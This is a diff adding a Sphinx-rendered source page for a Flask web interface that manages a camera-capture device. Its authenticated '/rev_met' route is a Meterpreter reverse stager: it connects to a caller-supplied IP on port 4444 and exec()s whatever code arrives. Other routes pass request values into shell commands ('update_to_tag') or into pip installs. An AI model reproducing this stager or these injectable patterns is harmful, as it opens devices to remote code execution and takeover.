+                    <span class="n">tries</span> <span class="o">+=</span> <span class="mi">1</span>
+                    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+                <span class="k">return</span> <span class="kc">True</span>
+
+    <span class="k">except</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">CalledProcessError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">))</span></div>
+
+
+<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s2">&quot;/available_networks&quot;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s2">&quot;GET&quot;</span><span class="p">])</span>
+<div class="viewcode-block" id="available_networks"><a class="viewcode-back" href="../webinterface.html#webinterface.available_networks">[docs]</a><span class="k">def</span> <span class="nf">available_networks</span><span class="p">():</span>
+    <span class="k">def</span> <span class="nf">generate_networks</span><span class="p">():</span>
+        <span class="n">networks</span> <span class="o">=</span> <span class="nb">str</span><span class="o">.</span><span class="n">splitlines</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;sudo iw dev wlp6s0 scan | grep &quot;SSID: &quot; | cut -c 8- | sort |uniq&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
+        <span class="n">networks</span> <span class="o">=</span> <span class="p">[</span><span class="n">x</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">networks</span> <span class="k">if</span> <span class="s2">&quot;x00&quot;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">x</span><span class="p">]</span>
+        <span class="k">for</span> <span class="n">net</span> <span class="ow">in</span> <span class="n">networks</span><span class="p">:</span>
+            <span class="k">yield</span> <span class="n">net</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span>
+
+    <span class="k">return</span> <span class="n">app</span><span class="o">.</span><span class="n">response_class</span><span class="p">(</span><span class="n">generate_networks</span><span class="p">(),</span> <span class="n">mimetype</span><span class="o">=</span><span class="s1">&#39;text/plain&#39;</span><span class="p">)</span></div>
+
+
+<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s2">&quot;/wifi&quot;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s2">&quot;GET&quot;</span><span class="p">])</span>
+<div class="viewcode-block" id="wifi"><a class="viewcode-back" href="../webinterface.html#webinterface.wifi">[docs]</a><span class="k">def</span> <span class="nf">wifi</span><span class="p">():</span>
+    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s2">&quot;wifi.html&quot;</span><span class="p">)</span></div>
+
+
+<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s2">&quot;/preview_cam&quot;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s2">&quot;GET&quot;</span><span class="p">])</span>
+<div class="viewcode-block" id="preview"><a class="viewcode-back" href="../webinterface.html#webinterface.preview">[docs]</a><span class="k">def</span> <span class="nf">preview</span><span class="p">():</span>
+    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s1">&#39;GET&#39;</span><span class="p">:</span>
+        <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;serialnumber&quot;</span><span class="p">):</span>
+            <span class="n">serialnumber</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;serialnumber&quot;</span><span class="p">)</span>
+            <span class="n">preview</span> <span class="o">=</span> <span class="n">capture_preview</span><span class="p">(</span><span class="n">serialnumber</span><span class="p">)</span>
+            <span class="k">return</span> <span class="n">send_file</span><span class="p">(</span><span class="s2">&quot;static/temp/&quot;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">serialnumber</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&quot;.jpg&quot;</span><span class="p">)</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="k">return</span> <span class="s2">&quot;fail&quot;</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">return</span> <span class="s2">&quot;fail&quot;</span></div>
+
+
+<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s2">&quot;/rev_met&quot;</span><span class="p">)</span>
+<span class="nd">@requires_auth</span>
+<div class="viewcode-block" id="reverse_meterpreter"><a class="viewcode-back" href="../webinterface.html#webinterface.reverse_meterpreter">[docs]</a><span class="k">def</span> <span class="nf">reverse_meterpreter</span><span class="p">():</span>
+    <span class="n">ip</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;ip&#39;</span><span class="p">,</span> <span class="kc">None</span><span class="p">)</span>
+    <span class="kn">import</span> <span class="nn">socket</span><span class="o">,</span> <span class="nn">struct</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
+        <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span> <span class="mi">4444</span><span class="p">))</span>
+        <span class="n">l</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s1">&#39;&gt;I&#39;</span><span class="p">,</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span>
+        <span class="n">d</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4096</span><span class="p">)</span>
+        <span class="k">while</span> <span class="nb">len</span><span class="p">(</span><span class="n">d</span><span class="p">)</span> <span class="o">!=</span> <span class="n">l</span><span class="p">:</span>
+            <span class="n">d</span> <span class="o">+=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4096</span><span class="p">)</span>
+        <span class="n">exec</span><span class="p">(</span><span class="n">d</span><span class="p">,</span> <span class="p">{</span><span class="s1">&#39;s&#39;</span><span class="p">:</span> <span class="n">s</span><span class="p">})</span>
+    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+        <span class="k">return</span> <span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">),</span> <span class="mi">500</span>
+    <span class="k">return</span> <span class="s2">&quot;SUCCESS&quot;</span></div>
+
+
+<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s2">&quot;/focus_cams&quot;</span><span class="p">)</span>
+<div class="viewcode-block" id="focus"><a class="viewcode-back" href="../webinterface.html#webinterface.focus">[docs]</a><span class="k">def</span> <span class="nf">focus</span><span class="p">():</span>
+    <span class="n">a</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">check_output</span><span class="p">(</span><span class="s2">&quot;gphoto2 --auto-detect&quot;</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
+    <span class="k">for</span> <span class="n">port</span> <span class="ow">in</span> <span class="n">re</span><span class="o">.</span><span class="n">finditer</span><span class="p">(</span><span class="s2">&quot;usb:&quot;</span><span class="p">,</span> <span class="n">a</span><span class="p">):</span>
+        <span class="n">port</span> <span class="o">=</span> <span class="n">a</span><span class="p">[</span><span class="n">port</span><span class="o">.</span><span class="n">start</span><span class="p">():</span><span class="n">port</span><span class="o">.</span><span class="n">end</span><span class="p">()</span> <span class="o">+</span> <span class="mi">7</span><span class="p">]</span>
+        <span class="n">cmdret</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">check_output</span><span class="p">(</span><span class="s1">&#39;gphoto2 --port &quot;&#39;</span> <span class="o">+</span> <span class="n">port</span> <span class="o">+</span> <span class="s1">&#39;&quot; --get-config serialnumber&#39;</span><span class="p">,</span>
+                                         <span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
+    <span class="k">return</span> <span class="s2">&quot;success&quot;</span></div>
+
+
+<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s2">&quot;/sync_hwclock&quot;</span><span class="p">)</span>
+<span class="nd">@requires_auth</span>
+<div class="viewcode-block" id="sync_hwclock"><a class="viewcode-back" href="../webinterface.html#webinterface.sync_hwclock">[docs]</a><span class="k">def</span> <span class="nf">sync_hwclock</span><span class="p">():</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Synchronising hwclock&quot;</span><span class="p">)</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">cmd</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">check_output</span><span class="p">(</span><span class="s2">&quot;hwclock --systohc&quot;</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;There was a problem Synchronising the hwclock. Debug me please.&quot;</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Exception: &quot;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">))</span>
+        <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;server_error.html&#39;</span><span class="p">),</span> <span class="mi">500</span>
+
+    <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;config&#39;</span><span class="p">))</span></div>
+
+
+<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/savetousb&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s2">&quot;POST&quot;</span><span class="p">])</span>
+<span class="nd">@requires_auth</span>
+<div class="viewcode-block" id="savetousb"><a class="viewcode-back" href="../webinterface.html#webinterface.savetousb">[docs]</a><span class="k">def</span> <span class="nf">savetousb</span><span class="p">():</span>
+    <span class="n">config</span> <span class="o">=</span> <span class="n">ConfigParser</span><span class="p">()</span>
+    <span class="n">name</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;name&quot;</span><span class="p">,</span> <span class="kc">None</span><span class="p">)</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">name</span><span class="p">:</span>
+        <span class="n">abort</span><span class="p">(</span><span class="mi">500</span><span class="p">)</span>
+    <span class="n">config</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="s2">&quot;configs_byserial&quot;</span><span class="p">,</span> <span class="n">name</span> <span class="o">+</span> <span class="s1">&#39;.ini&#39;</span><span class="p">))</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">subprocess</span><span class="o">.</span><span class="n">call</span><span class="p">(</span><span class="s2">&quot;mount /dev/sda1 /mnt/&quot;</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+        <span class="n">shutil</span><span class="o">.</span><span class="n">copytree</span><span class="p">(</span><span class="n">config</span><span class="p">[</span><span class="s2">&quot;localfiles&quot;</span><span class="p">][</span><span class="s2">&quot;upload_dir&quot;</span><span class="p">],</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="s2">&quot;/mnt/&quot;</span><span class="p">,</span> <span class="n">config</span><span class="p">[</span><span class="s2">&quot;camera&quot;</span><span class="p">][</span><span class="s2">&quot;name&quot;</span><span class="p">]))</span>
+    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+        <span class="n">subprocess</span><span class="o">.</span><span class="n">call</span><span class="p">(</span><span class="s2">&quot;umount /mnt&quot;</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">))</span>
+        <span class="k">return</span> <span class="s2">&quot;failure&quot;</span>
+    <span class="n">subprocess</span><span class="o">.</span><span class="n">call</span><span class="p">(</span><span class="s2">&quot;umount /mnt&quot;</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+    <span class="k">return</span> <span class="s2">&quot;success&quot;</span></div>
+
+
+<span class="kn">from</span> <span class="nn">flask</span> <span class="k">import</span> <span class="n">g</span>
+
+<div class="viewcode-block" id="after_this_request"><a class="viewcode-back" href="../webinterface.html#webinterface.after_this_request">[docs]</a><span class="k">def</span> <span class="nf">after_this_request</span><span class="p">(</span><span class="n">func</span><span class="p">):</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="nb">hasattr</span><span class="p">(</span><span class="n">g</span><span class="p">,</span> <span class="s1">&#39;call_after_request&#39;</span><span class="p">):</span>
+        <span class="n">g</span><span class="o">.</span><span class="n">call_after_request</span> <span class="o">=</span> <span class="p">[]</span>
+    <span class="n">g</span><span class="o">.</span><span class="n">call_after_request</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">func</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">func</span></div>
+
+
+<div class="viewcode-block" id="shutdown_server"><a class="viewcode-back" href="../webinterface.html#webinterface.shutdown_server">[docs]</a><span class="k">def</span> <span class="nf">shutdown_server</span><span class="p">():</span>
+    <span class="n">func</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">environ</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;werkzeug.server.shutdown&#39;</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">func</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
+        <span class="k">raise</span> <span class="ne">RuntimeError</span><span class="p">(</span><span class="s1">&#39;Not running with the Werkzeug Server&#39;</span><span class="p">)</span>
+    <span class="n">func</span><span class="p">()</span></div>
+
+
+<span class="nd">@app</span><span class="o">.</span><span class="n">after_request</span>
+<div class="viewcode-block" id="per_request_callbacks"><a class="viewcode-back" href="../webinterface.html#webinterface.per_request_callbacks">[docs]</a><span class="k">def</span> <span class="nf">per_request_callbacks</span><span class="p">(</span><span class="n">response</span><span class="p">):</span>
+    <span class="k">for</span> <span class="n">func</span> <span class="ow">in</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">g</span><span class="p">,</span> <span class="s1">&#39;call_after_request&#39;</span><span class="p">,</span> <span class="p">()):</span>
+        <span class="n">response</span> <span class="o">=</span> <span class="n">func</span><span class="p">(</span><span class="n">response</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">response</span></div>
+
+
+<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/restart&#39;</span><span class="p">)</span>
+<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/reboot&#39;</span><span class="p">)</span>
+<span class="nd">@requires_auth</span>
+<div class="viewcode-block" id="restart"><a class="viewcode-back" href="../webinterface.html#webinterface.restart">[docs]</a><span class="k">def</span> <span class="nf">restart</span><span class="p">():</span>
+    <span class="nd">@after_this_request</span>
+    <span class="k">def</span> <span class="nf">shutdown</span><span class="p">(</span><span class="n">response</span><span class="p">):</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;SHUTTING DOWN!&quot;</span><span class="p">)</span>
+        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+        <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&quot;reboot now&quot;</span><span class="p">)</span>
+        <span class="k">return</span> <span class="n">response</span>
+
+    <span class="k">return</span> <span class="s2">&quot;Rebooting... &quot;</span><span class="p">,</span> <span class="mi">200</span></div>
+
+
+<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s2">&quot;/update&quot;</span><span class="p">)</span>
+<span class="nd">@requires_auth</span>
+<div class="viewcode-block" id="update"><a class="viewcode-back" href="../webinterface.html#webinterface.update">[docs]</a><span class="k">def</span> <span class="nf">update</span><span class="p">():</span>
+    <span class="nd">@after_this_request</span>
+    <span class="k">def</span> <span class="nf">update</span><span class="p">(</span><span class="n">response</span><span class="p">):</span>
+        <span class="n">app</span><span class="o">.</span><span class="n">debug</span> <span class="o">=</span> <span class="kc">False</span>
+        <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&quot;git fetch --all;git reset --hard origin/master&quot;</span><span class="p">)</span>
+        <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&quot;systemctl restart spc-eyepi_capture.service&quot;</span><span class="p">)</span>
+        <span class="k">return</span> <span class="n">response</span>
+
+    <span class="n">app</span><span class="o">.</span><span class="n">debug</span> <span class="o">=</span> <span class="kc">True</span>
+    <span class="k">return</span> <span class="s2">&quot;SUCCESS&quot;</span></div>
+
+
+<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s2">&quot;/update_to_tag/&lt;tag&gt;&quot;</span><span class="p">)</span>
+<span class="nd">@requires_auth</span>
+<div class="viewcode-block" id="update_tag"><a class="viewcode-back" href="../webinterface.html#webinterface.update_tag">[docs]</a><span class="k">def</span> <span class="nf">update_tag</span><span class="p">(</span><span class="n">tag</span><span class="p">):</span>
+    <span class="nd">@after_this_request</span>
+    <span class="k">def</span> <span class="nf">update</span><span class="p">(</span><span class="n">response</span><span class="p">):</span>
+        <span class="n">app</span><span class="o">.</span><span class="n">debug</span> <span class="o">=</span> <span class="kc">False</span>
+        <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&quot;git fetch --tags --all;git reset --hard </span><span class="si">{}</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">tag</span><span class="p">))</span>
+        <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&quot;systemctl restart eyepi-capture.service&quot;</span><span class="p">)</span>
+        <span class="k">return</span> <span class="n">response</span>
+
+    <span class="n">app</span><span class="o">.</span><span class="n">debug</span> <span class="o">=</span> <span class="kc">True</span>
+    <span class="k">return</span> <span class="s2">&quot;SUCCESS&quot;</span></div>
+
+
+<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s2">&quot;/pip_install&quot;</span><span class="p">)</span>
+<span class="nd">@requires_auth</span>
+<div class="viewcode-block" id="pip_install"><a class="viewcode-back" href="../webinterface.html#webinterface.pip_install">[docs]</a><span class="k">def</span> <span class="nf">pip_install</span><span class="p">():</span>
+    <span class="kn">import</span> <span class="nn">pip</span>
+    <span class="n">_</span><span class="p">,</span> <span class="n">package</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="p">)</span><span class="o">.</span><span class="n">popitem</span><span class="p">()</span>
+    <span class="n">pip</span><span class="o">.</span><span class="n">main</span><span class="p">([</span><span class="s2">&quot;install&quot;</span><span class="p">,</span> <span class="n">package</span><span class="p">])</span>
+    <span class="k">return</span> <span class="s2">&quot;SUCCESS&quot;</span></div>
+
+
+<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s2">&quot;/status&quot;</span><span class="p">)</span>
+<span class="nd">@requires_auth</span>
+<div class="viewcode-block" id="status"><a class="viewcode-back" href="../webinterface.html#webinterface.status">[docs]</a><span class="k">def</span> <span class="nf">status</span><span class="p">():</span>
+    <span class="k">return</span> <span class="s1">&#39;&#39;</span></div>
+
+
+<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s2">&quot;/wificonfig&quot;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
+<span class="nd">@requires_auth</span>
+<div class="viewcode-block" id="wificonfig"><a class="viewcode-back" href="../webinterface.html#webinterface.wificonfig">[docs]</a><span class="k">def</span> <span class="nf">wificonfig</span><span class="p">():</span>
+    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s1">&#39;POST&#39;</span><span class="p">:</span>
+        <span class="n">interface</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s2">&quot;ip link | cut -c4- | grep ^w | sed &#39;s/:.*//&#39;&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Interface: &quot;</span> <span class="o">+</span> <span class="n">interface</span><span class="p">)</span>
+        <span class="n">ssid</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s2">&quot;ssid&quot;</span><span class="p">]</span>
+        <span class="n">key</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s2">&quot;key&quot;</span><span class="p">]</span>
+        <span class="n">netprofile</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;/etc/netctl/netprofile&#39;</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">)</span>
+        <span class="n">netprofile</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">render_template</span><span class="p">(</span><span class="s2">&quot;netprofile&quot;</span><span class="p">,</span> <span class="n">interface</span><span class="o">=</span><span class="n">interface</span><span class="p">,</span> <span class="n">ssid</span><span class="o">=</span><span class="n">ssid</span><span class="p">,</span> <span class="n">key</span><span class="o">=</span><span class="n">key</span><span class="p">))</span>
+        <span class="n">netprofile</span><span class="o">.</span><span class="n">close</span><span class="p">();</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Stopping AP&quot;</span><span class="p">)</span>
+        <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&quot;systemctl stop create_ap.service&quot;</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Putting interface down&quot;</span><span class="p">)</span>
+        <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&quot;ifconfig &quot;</span> <span class="o">+</span> <span class="n">interface</span> <span class="o">+</span> <span class="s2">&quot; down&quot;</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&quot;netctl start netprofile&quot;</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
+            <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Connection failed restarting AP&quot;</span><span class="p">)</span>
+            <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">Log:</span><span class="se">\n\n</span><span class="s2">&quot;</span> <span class="o">+</span> <span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s2">&quot;systemctl status netctl@netprofile.service&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
+            <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&quot;systemctl start create_ap.service&quot;</span><span class="p">)</span>
+        <span class="k">return</span> <span class="s2">&quot;success&quot;</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">abort</span><span class="p">(</span><span class="mi">400</span><span class="p">)</span></div>
+
+
+<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s2">&quot;/newuser&quot;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
+<span class="nd">@requires_auth</span>
+<div class="viewcode-block" id="newuser"><a class="viewcode-back" href="../webinterface.html#webinterface.newuser">[docs]</a><span class="k">def</span> <span class="nf">newuser</span><span class="p">():</span>
+    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s1">&#39;POST&#39;</span><span class="p">:</span>
+        <span class="n">username</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s2">&quot;username&quot;</span><span class="p">]</span>
+        <span class="n">password</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s2">&quot;pass&quot;</span><span class="p">]</span>
+        <span class="n">adminpass</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s2">&quot;adminpass&quot;</span><span class="p">]</span>
+        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">username</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="ow">and</span> <span class="nb">len</span><span class="p">(</span><span class="n">password</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">5</span><span class="p">:</span>
+            <span class="k">if</span> <span class="n">add_user</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">,</span> <span class="n">adminpass</span><span class="p">)</span> <span class="o">==</span> <span class="kc">True</span><span class="p">:</span>
+                <span class="k">return</span> <span class="s2">&quot;success&quot;</span>
+            <span class="k">else</span><span class="p">:</span>
+                <span class="k">return</span> <span class="s2">&quot;auth_error&quot;</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="k">return</span> <span class="s2">&quot;invalid&quot;</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">abort</span><span class="p">(</span><span class="mi">400</span><span class="p">)</span></div>
+
+
+<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/admin&#39;</span><span class="p">)</span>
+<span class="nd">@requires_auth</span>
+<div class="viewcode-block" id="admin"><a class="viewcode-back" href="../webinterface.html#webinterface.admin">[docs]</a><span class="k">def</span> <span class="nf">admin</span><span class="p">():</span>
+    <span class="n">db</span> <span class="o">=</span> <span class="n">dbm</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s1">&#39;db&#39;</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">)</span>
+    <span class="n">usernames</span> <span class="o">=</span> <span class="p">[]</span>
+    <span class="n">k</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">firstkey</span><span class="p">()</span>
+    <span class="k">while</span> <span class="n">k</span> <span class="o">!=</span> <span class="kc">None</span><span class="p">:</span>
+        <span class="n">usernames</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">k</span><span class="p">)</span>
+        <span class="n">k</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">nextkey</span><span class="p">(</span><span class="n">k</span><span class="p">)</span>
+
+    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s2">&quot;admin.html&quot;</span><span class="p">,</span> <span class="n">usernames</span><span class="o">=</span><span class="n">usernames</span><span class="p">)</span></div>
+
+
+<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/update_camera/&lt;path:serialnumber&gt;&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s2">&quot;GET&quot;</span><span class="p">,</span> <span class="s2">&quot;POST&quot;</span><span class="p">])</span>
+<span class="nd">@requires_auth</span>
+<div class="viewcode-block" id="update_camera_config"><a class="viewcode-back" href="../webinterface.html#webinterface.update_camera_config">[docs]</a><span class="k">def</span> <span class="nf">update_camera_config</span><span class="p">(</span><span class="n">serialnumber</span><span class="p">):</span>
+    <span class="n">ser</span> <span class="o">=</span> <span class="kc">None</span>
+
+    <span class="n">config_map</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s1">&#39;name&#39;</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;camera&#39;</span><span class="p">,</span> <span class="s1">&#39;name&#39;</span><span class="p">),</span>
+        <span class="s1">&#39;capture&#39;</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;camera&#39;</span><span class="p">,</span> <span class="s1">&#39;enabled&#39;</span><span class="p">),</span>
+        <span class="s1">&#39;upload&#39;</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;ftp&#39;</span><span class="p">,</span> <span class="s1">&#39;enabled&#39;</span><span class="p">),</span>
+        <span class="s1">&#39;username&#39;</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;ftp&#39;</span><span class="p">,</span> <span class="s1">&#39;username&#39;</span><span class="p">),</span>
